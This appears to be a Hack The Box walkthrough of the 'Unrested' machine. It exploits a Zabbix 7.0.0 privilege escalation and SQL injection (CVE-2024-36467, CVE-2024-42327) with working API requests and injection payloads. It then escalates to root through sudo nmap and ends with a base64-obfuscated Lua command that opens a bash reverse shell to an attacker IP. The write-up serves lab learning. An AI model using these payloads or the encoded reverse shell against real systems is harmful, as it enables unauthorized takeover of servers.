---
title: "Exploiting Zabbix SQL injection(CVE-2024-42327 / ZBX-25623) in HTB Unrested"
description: The exploitation of CVE-2024-36467, CVE-2024-42327 in terms of HTB Unrested machine. A simple option for SQL injection and PoC. Zabbix 7.0.0
author: filip
date: 2024-12-10 10:00:00 0000
categories: [Web Security, Hack The Box]
tags: [Notes, Web Security, WhiteBox, CVE, Zabbix, SQL Injection, Privilege escalation, CVE-2024-36467,CVE-2024-42327]
render_with_liquid: false
---

![Logo](assets/img/Unrested/unrested-logo-min.webp)

## Start
The machine spawns with generated credentials, for me there were:
**matthew / `changedpasswd`**





Begin with nmap and see that the machine has default web and zabbix agent’s ports opened:

![image.png](assets/img/Unrested/image.png){: .shadow }

When reaching web it declares to have Zabbix 7.0.0 running on it. This version was found to have 2 recently discovered CVEs: app’s privilege escalation and SQL injection, both affecting API endpoints.

![image.png](assets/img/Unrested/image%201.png){: .shadow  }

## CVE-2024-36467

The **CVE-2024-36467** [^CVE-2024-36467] declares that it is possible for any user having valid account on zabbix and is allowed to reach API endpoints may change their zabbix role up to “Zabbix administrator” role that is actually a “superuser” for the application defined in the documentation. Just need to have  access to the `user.update` API.

Searching the zabbix API call’s structure, found following information ([^user-update]) that in partucal, the interesting for us request has the following body:

```json
{
    "jsonrpc": "2.0",
    "method": "user.update",
    "params": {
        "userid": "<your-users-id>",
        "roleid": "<role-id-you-need>"
    },
    "id": 1
}
``` 
{: .nolineno }

But, before sending this request directly, let’s authenticate to the API. 

According to the “Authentication” page, we need the following request to be sent initially, grab token, and use it for the authorization:

```bash
curl --request POST \
         --url 'https://example.com/zabbix/api_jsonrpc.php' \
         --header 'Content-Type: application/json-rpc' \
         --data '{"jsonrpc":"2.0","method":"user.login","params":{"username":"Admin","password":"zabbix"},"id":1}'
The expected response:
{
    "jsonrpc": "2.0",
    "result": "<token>",
    "id": 1
} 
```
{: .nolineno }

Authorized requests have this token in “Authorization: Bearer <token>” header like following:

```bash
curl --request POST \
  --url 'https://example.com/zabbix/api_jsonrpc.php' \
  --header 'Authorization: Bearer 0424bd59b807674191e7d77572075f33'
```

Having this puzzle together we have a successful authentication:

```bash
curl --request POST \
         --url 'http://unrested.htb/zabbix/api_jsonrpc.php' \
         --header 'Content-Type: application/json-rpc' \
         --data '{"jsonrpc":"2.0","method":"user.login","params":\
         {"username":"matthew","password":"changedpass"},"id":1}'

Response:
{"jsonrpc":"2.0","result":"399d8bffa6f5dafdf18c1c15978a092b","id":1}      
```

Then, I suggested according to the documentation that **Zabbix Administrator** role is 7 and the group “**Internal**” is 13 (both give full access for API, and their id values may change on different deployments), and I tried to guess my user’s role, seems it was userid=3:

```bash
curl --request POST \
  --url 'http://unrested.htb/zabbix/api_jsonrpc.php' \
  --header 'Authorization: Bearer 399d8bffa6f5dafdf18c1c15978a092b'\
  --header 'Content-Type: application/json-rpc\
  --data '{"jsonrpc": "2.0", "method": "user.update", "params": \
  {"userid": "1", "roleid": "1"}, "id": 1 }' \
  -x http://127.0.0.1:8080

{"jsonrpc":"2.0","error":{"code":-32500,"message":"Application error.","data":"No permissions to referred object or it does not exist!"},"id":1}                                                                                               ... 

curl --request POST \
  --url 'http://unrested.htb/zabbix/api_jsonrpc.php' \
  --header 'Authorization: Bearer 399d8bffa6f5dafdf18c1c15978a092b' \
  --header 'Content-Type: application/json-rpc' \
  --data '{"jsonrpc": "2.0", "method": "user.update", "params": \
  {"userid": "3", "roleid": "3"}, "id": 1 }' \
  -x http://127.0.0.1:8080

{"jsonrpc":"2.0","error":{"code":-32602,"message":"Invalid params.",\
"data":"User cannot change own role."},"id":1}   
```
It did not work, but in a CUser.php we can find function checkHimself(start at 1109)[^CUser-checkHimself], that is called when we trigger user.update function and see that the next check for `usrgrps` is missing for self-assigning and according to documentation we can leverage this parameter to assign our user multiple groups using usrgrpid [^usrgrpid] 

```php
private function checkHimself(array $users) {
	foreach ($users as $user) {
		if (bccomp($user['userid'], self::$userData['userid']) == 0) {
			if (array_key_exists('roleid', $user) && $user['roleid'] != self::$userData['roleid']) {
				self::exception(ZBX_API_ERROR_PARAMETERS, _('User cannot change own role.'));
			}

			if (array_key_exists('usrgrps', $user)) {
				$db_usrgrps = DB::select('usrgrp', [
					'output' => ['gui_access', 'users_status'],
					'usrgrpids' => zbx_objectValues($user['usrgrps'], 'usrgrpid')
				]);
```
so the following request worked as intended:
```bash
curl --request POST \
  --url 'http://unrested.htb/zabbix/api_jsonrpc.php' \
  --header 'Authorization: Bearer 129592fc742947f1153cc3db987e85fb' \
  --header 'Content-Type: application/json-rpc' \
  --data '{"jsonrpc": "2.0", "method": "user.update", "params": \
  {"userid": "3", "usrgrps": [{"usrgrpid":"7"},{"usrgrpid":"13"}]}, "id": 1 }'\
  -x http://127.0.0.1:8080

{"jsonrpc":"2.0","result":{"userids":["3"]},"id":1} 
```
{: .nolineno }

> A request above is an actual PoC for **CVE-2024-36467** [^privesc-poc], only for learning and preventing purposes.
{: .prompt-tip }


## CVE-2024-42327 / ZBX-25623

Then we need to exploit SQL injection to get the command execution and land us to the initial foothold on a machine.[^CVE-2024-42327]


> ⚠️ A non-admin user account on the Zabbix frontend with the default User role, or with any other role that gives API access can exploit this vulnerability. An SQLi exists in the CUser class in the addRelatedObjects function, this function is being called from the CUser.get function which is available for every user who has API access.
{: .prompt-info }


The following code from version 6.0.31 is vulnerable to SQLi :

```php
$db_roles = DBselect(
    'SELECT u.userid'.($options['selectRole'] ? ',r.'.implode(',r.', $options['selectRole']) : '').
    ' FROM users u,role r'.
    ' WHERE u.roleid=r.roleid'.
    ' AND '.dbConditionInt('u.userid', $userIds)
);
```
{: .nolineno }

As we can see it here on line 3046 of function `addRelatedObjects`[^SQL-addRelatedObjects] that is called in user.get function (defined at line 68, call on line 234)[^user-get]

So the valid legitimate request seems to be like following example:

```bash
POST /zabbix/api_jsonrpc.php HTTP/1.1
Host: unrested.htb
User-Agent: curl/7.83.1
Accept: */*
Authorization: Bearer token
Content-Type: application/json-rpc
Content-Length: 221
Connection: close

{"jsonrpc":"2.0"
,
"method":"user.get"
,
"params":{
            "selectRole": ["roleid", "name", "type", "readonly"],
            "userids": ["3"]
        },
"auth":"token"
,
"id":1}
```
{: .nolineno }

where array of `selectRole` is being inserted in the select query and is imploded as a string.

After transformations the SQL query seems to be like:

```sql
SELECT u.userid, r.roleid, r.name, r.type, r.readonly
FROM users u, role r
WHERE u.roleid = r.roleid
AND u.userid IN …
```
{: .nolineno }

According to how it was implemented in the code, we can suggest the very classic SQL injection:

```bash
POST /zabbix/api_jsonrpc.php HTTP/1.1
Host: unrested.htb
User-Agent: curl/7.83.1
Accept: */*
Authorization: Bearer a327c118b37a32cb9fbbe1c80b01f8f9
Content-Type: application/json-rpc
Content-Length: 173
Connection: close

{"jsonrpc":"2.0"
,
"method":"user.get"
,
"params":{
            "selectRole": ["roleid, @@version"],
            "userids": ["1"]
        },
"auth":"a"
,
"id":1}

```
{: .nolineno }

That will transform the SQL query as following:

```sql
SELECT u.userid, r.roleid, @@version
FROM users u, role r
WHERE u.roleid = r.roleid
AND u.userid IN …
```
{: .nolineno }

Check response:

![image.png](assets/img/Unrested/image%202.png){: .shadow }

Go further  and confirm nested SQL queries supported:
```json
{
  "jsonrpc": "2.0",
  "method": "user.get",
  "params": {
    "selectRole": [
      "roleid, (Select 'mrlsecurity.com')"
    ],
    "userids": [
      "1"
    ]
  },
  "auth": "a",
  "id": 1
}
```
{: .nolineno }

> The SQL injection above is much simplier than suggested by compr00t in his POc, no need to struggle with time-based technique for data exfiltration, as the Zabbix 7.0.0 configuration allows us to use non-blind methods. Consider this as more efficient PoC for **CVE-2024-42327** [^PoC-sql-my]. 
For learning and prevention purpuses only!
{: .prompt-tip }

![image.png](assets/img/Unrested/image%203.png){: .shadow }

and let us retrieve all the tables available since nested SQL queries work and we can do some things manually, but it is important to keep in mind, that this code limits our output to have only 1 row (we need to use **LIMIT 1**, **TOP 1**, concatenations, and other methods to get our output as 1 string). 
In this case I gonna use **`GROUP_CONCAT`** MySQL method:

![image.png](assets/img/Unrested/image%204.png){: .shadow }

Let’s then retrieve superuser’s session(at first column names so we know what we call):

![image.png](assets/img/Unrested/image%205.png){: .shadow }

![image.png](assets/img/Unrested/image%206.png){: .shadow }

Great, now we have a valid session of **`userid=1`** that belongs to Zabbix Administrator user(app’s superuser).

Check documentation if we have possibility to create `system.run` items, Zzabbix functions that according to documentation lets us run system commands on demand if **`EnableRemoteCommands=1`** is set[^system-run]

for running so we need also to know the hostid and interfaceid [^hostid]. lets get it and set up a remote shell:

```json
{
    "jsonrpc": "2.0",
    "method": "host.get",
    "params": {
        "output": ["hostid"],
        "selectHostGroups": "extend",
"selectInterfaces":["interfaceid"]
    },
    "id": 1
}
```
{: .nolineno }

![image.png](assets/img/Unrested/image%207.png){: .shadow }

## Shell as Zabbix

Create RCE confirmation with callback to my web server:

![image.png](assets/img/Unrested/image%208.png){: .shadow }

![image.png](assets/img/Unrested/image%209.png){: .shadow }

Get a reverse shell:

![image.png](assets/img/Unrested/image%2010.png){: .shadow }

Get a user flag from `/home/matthew/`

## Shell as root

Check `sudo -l` and see that we can run sudo nmap command, but seems nmap is restricted.
![image.png](assets/img/Unrested/image%2013.png){: .shadow }
we cannot run anything available on GTFObins but,  the internet and nmap’s documentation gives us information[^nmap-doc] that says that we can replace default data files of nmap, including scripts and main files that are usually in `/usr/share/nmap` or `/usr/local/share/nmap`

The internet says that `nse_main.lua` is important file, that nmap loads, when executes default scripts with `-sC` flag. 
Dropped RCE check `os.execute('touch /dev/shm/rcelol')` into our custom nse_main.lua file and trigger it with `--datadir`:

![image.png](assets/img/Unrested/image%2011.png){: .shadow }

OK, to get root  shell and flag. I used `b3MuZXhlY3V0ZSgnZWNobyBZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzh4TUM0eE1DNHhOQzQxTUM4NU1EQXhJREErSmpFPSB8IGJhc2U2NCAtZCB8IGJhc2gnKTs=`:

![image.png](assets/img/Unrested/image%2012.png){: .shadow }

[Completion](https://www.hackthebox.com/achievement/machine/124699/639)

## References:
Machine Author: [TheCyberGeek](https://app.hackthebox.com/users/114053)

**Footnote links:**

[^CVE-2024-36467]: [CVE-2024-36467 / ZBX-25614](https://support.zabbix.com/browse/ZBX-25614), 

[^privesc-poc]: PoC for CVE-2024-36467 / ZBX-25614

[^user-update]: Documentation on [user.update](https://www.zabbix.com/documentation/current/en/manual/api/reference/user/update)

[^CUser-checkHimself]: [function checkHimself](https://github.com/zabbix/zabbix/blob/7.0.0/ui/include/classes/api/services/CUser.php#L1109C2-L1120C9) 

[^usrgrpid]: [Documentation on usergroup object](https://www.zabbix.com/documentation/current/en/manual/api/reference/usergroup/object)

[^CVE-2024-42327]: [CVE-2024-42327 / ZBX-25623](https://support.zabbix.com/browse/ZBX-25623), [POC](https://github.com/compr00t/CVE-2024-42327/tree/main)

[^PoC-sql-my]: Proof Of Concept for CVE-2024-42327 / ZBX-25623 by mrlsecurity.

[^SQL-addRelatedObjects]: Github lines [3041-3051](https://github.com/zabbix/zabbix/blob/49955f1fb5c9168a8a24b053f7ade6b3d903143c/ui/include/classes/api/services/CUser.php#L3041C1-L3051C6)

[^user-get]: Call for addRelatedObjects in [user.get](https://github.com/zabbix/zabbix/blob/49955f1fb5c9168a8a24b053f7ade6b3d903143c/ui/include/classes/api/services/CUser.php#L234)

[^system-run]: Documentation on Zabbix [system.run](https://www.zabbix.com/documentation/current/en/manual/config/items/itemtypes/zabbix_agent#system.run)

[^hostid]: Documentation on Zabbix [hostid and interfaceid](https://www.zabbix.com/documentation/7.2/en/manual/api/reference/host/get?hl=host.get)

[^nmap-doc]: nmap [documentation](https://nmap.org/book/data-files-replacing-data-files.html)